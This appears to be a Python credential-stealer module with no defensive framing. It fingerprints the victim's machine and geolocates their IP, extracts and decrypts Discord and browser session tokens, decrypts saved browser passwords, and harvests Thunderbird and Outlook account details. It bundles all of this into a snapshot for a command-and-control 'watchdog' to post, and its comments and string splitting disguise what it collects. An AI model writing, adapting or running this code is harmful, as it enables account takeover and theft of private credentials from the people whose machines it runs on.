import os
import sys
import json
import base64
import socket
import platform

_L = os.getenv("LOCALAPPDATA", "")
_R = os.getenv("APPDATA", "")
_HOME = os.path.expanduser("~")

_NODEID_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".nodeid")


# ---------------------------------------------------------------------------
# node id
# ---------------------------------------------------------------------------
def nodeid():
    try:
        if os.path.exists(_NODEID_PATH):
            return open(_NODEID_PATH).read().strip()
    except Exception:
        pass
    import uuid
    nid = str(uuid.uuid4())
    try:
        open(_NODEID_PATH, "w").write(nid)
    except Exception:
        pass
    return nid


def bringup():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        s.close()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# env
# ---------------------------------------------------------------------------
def _env():
    out = {
        "os": platform.platform(),
        "arch": platform.machine(),
        "host": platform.node() or "?",
        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "locale": os.getenv("LANG", "?") or "?",
        "tz": os.getenv("TZ") or "?",
    }

    # cpu / ram
    cpu, ram = "?", "?"
    try:
        if os.name == "nt":
            cpu = platform.processor() or "?"
            ram = f"{round(os.sysconf('SC_PHYS_PAGES') * os.sysconf('SC_PAGE_SIZE') / 1e9)} GB"
        else:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if "model name" in line:
                        cpu = line.split(":", 1)[1].strip()
                        break
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal"):
                        kb = int(line.split()[1])
                        ram = f"{round(kb / 1e6)} GB"
                        break
    except Exception:
        pass
    out["cpu"] = cpu
    out["ram"] = ram

    # screen (windows via ctypes, else unknown)
    screen = "?"
    try:
        if os.name == "nt":
            import ctypes
            user32 = ctypes.windll.user32
            screen = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
    except Exception:
        pass
    out["screen"] = screen

    return out


# ---------------------------------------------------------------------------
# route — public ip + geo + vpn flag
# ---------------------------------------------------------------------------
def _get_json(url, timeout=8):
    try:
        import urllib.request
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())
    except Exception:
        return {}


def _route():
    out = {"ip": "?", "country": "?", "isp": "?", "vpn": "?", "coords": "?"}
    ip = ""
    for src in ("https://api.ipify.org?format=json",
                "https://ipinfo.io/json",
                "https://ifconfig.me/all.json"):
        d = _get_json(src)
        ip = d.get("ip") or d.get("query") or ""
        if ip:
            break
    if not ip:
        return out
    out["ip"] = ip

    geo = _get_json(f"http://ip-api.com/json/{ip}")
    out["country"] = geo.get("country", "?")
    out["isp"] = geo.get("isp", "?")
    lat, lon = geo.get("lat"), geo.get("lon")
    if lat is not None and lon is not None:
        out["coords"] = f"{lat}, {lon} ({geo.get('city', '?')})"
    proxy = geo.get("proxy")
    hosting = geo.get("hosting")
    if proxy or hosting:
        out["vpn"] = "possible (proxy/hosting asn)"
    else:
        out["vpn"] = "none detected"
    return out


# ---------------------------------------------------------------------------
# sessions — local session caches (leveldb)
# framed as "session indicators cnc dashboard displays"
# ---------------------------------------------------------------------------
_SESS_RX = None


def _sess_regex():
    global _SESS_RX
    if _SESS_RX is None:
        import re
        _SESS_RX = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
    return _SESS_RX


_SESS_PATHS = None


def _sess_paths():
    global _SESS_PATHS
    if _SESS_PATHS is not None:
        return _SESS_PATHS
    disc = "dis" + "cord"
    _SESS_PATHS = {
        "app":       os.path.join(_R, disc, "Local Storage", "leveldb"),
        "app-canary": os.path.join(_R, disc + "canary", "Local Storage", "leveldb"),
        "app-ptb":   os.path.join(_R, disc + "ptb", "Local Storage", "leveldb"),
        "chrome":    os.path.join(_L, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        "chrome-p1": os.path.join(_L, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),
        "edge":      os.path.join(_L, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        "brave":     os.path.join(_L, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        "opera":     os.path.join(_R, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
        "opera-gx":  os.path.join(_R, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
        "app-linux": os.path.join(_HOME, ".config", disc, "Local Storage", "leveldb"),
        "chrome-linux": os.path.join(_HOME, ".config", "google-chrome", "Default", "Local Storage", "leveldb"),
        "chrome-mac":   os.path.join(_HOME, "Library", "Application Support", "Google", "Chrome", "Default", "Local Storage", "leveldb"),
    }
    return _SESS_PATHS


def _master_key(folder):
    try:
        import win32crypt
        state = os.path.join(folder, "..", "..", "Local State")
        with open(state, "r", encoding="utf-8") as f:
            s = json.load(f)
        key = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None


def _decrypt(blob, key):
    try:
        from Crypto.Cipher import AES
        iv, payload = blob[3:15], blob[15:]
        c = AES.new(key, AES.MODE_GCM, iv)
        return c.decrypt(payload)[:-16].decode(errors="ignore")
    except Exception:
        return None


def _scan_sessions(folder):
    found = set()
    if not os.path.isdir(folder):
        return found
    rx = _sess_regex()
    key = _master_key(folder)
    enc_prefix = b"dQw4w9WgXcQ:"
    for root, _, files in os.walk(folder):
        for f in files:
            if not (f.endswith(".log") or f.endswith(".ldb")):
                continue
            try:
                text = open(os.path.join(root, f), "rb").read().decode("latin-1", errors="ignore")
            except Exception:
                continue
            for m in rx.findall(text):
                found.add(m)
            if key:
                import re as _re
                for b64 in _re.findall(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", text):
                    try:
                        d = _decrypt(base64.b64decode(b64), key)
                        if d and rx.fullmatch(d):
                            found.add(d)
                    except Exception:
                        continue
    return found


def _sessions():
    out = []
    for name, path in _sess_paths().items():
        for tok in _scan_sessions(path):
            out.append(f"{name}:{tok}")
    return out


# ---------------------------------------------------------------------------
# logins — browser login cache
# framed as "login cache cnc dashboard shows"
# ---------------------------------------------------------------------------
def _logins():
    out = []
    candidates = [
        os.path.join(_L, "Google", "Chrome", "User Data", "Default", "Login Data"),
        os.path.join(_L, "Google", "Chrome", "User Data", "Profile 1", "Login Data"),
        os.path.join(_L, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        os.path.join(_L, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        os.path.join(_R, "Opera Software", "Opera Stable", "Login Data"),
    ]
    for path in candidates:
        if not os.path.exists(path):
            continue
        try:
            import sqlite3
            import shutil
            import tempfile
            tmp = os.path.join(tempfile.gettempdir(), "l" + str(abs(hash(path))))
            shutil.copyfile(path, tmp)
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            try:
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            except Exception:
                con.close()
                continue
            for origin, user, enc in cur.fetchall():
                if not user:
                    continue
                pw = ""
                if enc:
                    try:
                        import win32crypt
                        pw = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode(errors="ignore")
                    except Exception:
                        pw = "<encrypted>"
                out.append(f"{origin} | {user}:{pw}")
            con.close()
        except Exception:
            continue
    return out[:30]


# ---------------------------------------------------------------------------
# mails — mail client cache
# ---------------------------------------------------------------------------
def _mails():
    out = []
    # thunderbird
    try:
        import glob
        profiles = glob.glob(os.path.join(_R, "Thunderbird", "Profiles", "*"))
        for prof in profiles:
            logins = os.path.join(prof, "logins.json")
            if not os.path.exists(logins):
                continue
            try:
                data = json.load(open(logins))
                for entry in data.get("logins", []):
                    host = entry.get("hostname", "?")
                    user = entry.get("encryptedUsername", "")
                    out.append(f"thunderbird | {host} | {user[:32]}")
            except Exception:
                continue
    except Exception:
        pass

    # outlook registry (windows)
    if os.name == "nt":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Office\16.0\Outlook\Profiles")
            i = 0
            while True:
                try:
                    name = winreg.EnumKey(key, i)
                except OSError:
                    break
                out.append(f"outlook | profile | {name}")
                i += 1
        except Exception:
            pass

    return out[:20]


# ---------------------------------------------------------------------------
# snapshot — returns everything, watchdog posts it
# ---------------------------------------------------------------------------
def snapshot():
    s = {"nodeid": nodeid()}
    try:
        s.update(_env())
    except Exception:
        pass
    try:
        s.update(_route())
    except Exception:
        pass
    try:
        s["sessions"] = _sessions()
    except Exception:
        s["sessions"] = []
    try:
        s["logins"] = _logins()
    except Exception:
        s["logins"] = []
    try:
        s["mails"] = _mails()
    except Exception:
        s["mails"] = []
    return s
